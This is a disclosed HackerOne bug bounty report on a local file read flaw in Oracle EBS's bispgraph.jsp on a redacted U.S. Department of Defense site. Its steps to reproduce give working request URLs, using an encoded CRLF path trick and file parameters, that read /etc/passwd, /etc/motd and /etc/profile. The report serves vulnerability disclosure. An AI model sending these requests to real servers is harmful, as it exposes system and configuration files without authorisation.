# PHP Local File Inclusion

_1 reports — High/Critical, disclosed_

### [Local File Read vulnerability on ██████████ [HtUS]](https://hackerone.com/reports/1624670)

- **Report ID:** `1624670`
- **Severity:** High
- **Weakness:** PHP Local File Inclusion
- **Program:** U.S. Dept Of Defense
- **Reporter:** @demon1c
- **Bounty:** 500 usd
- **Disclosed:** 2023-01-06T19:02:02.451Z
- **CVE(s):** -

**Vulnerability Information:**

Kindly check screenshot ███████: In case if scope question. Because i picked this site from DOD website list under 'dod sites'. Lets move on to the bug now :)

## Summary:
Local File Include vulnerability on ███. Oracle Ebs Bispgrapgh is prone to a directory traversal vulnerability that can be exploited by remote attackers to access sensitive data on the server.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. to view /etc/passwd file visit https://██████/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
  2.  to view /etc/motd file visit https://██████████/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=motd&ifl=/etc/
  3.  to view /etc/profile visit https://██████/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=profile&ifl=/etc/
## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

* █████:
* █████:
* https://web.cystack.net/vulnerability/cystack.remote.oracle_ebs_bispgrapgh_file_read

## Impact

An attacker could read local files on the web server that they would normally not have access to, such as the application source code or configuration files containing sensitive information on how the website is configured.

---
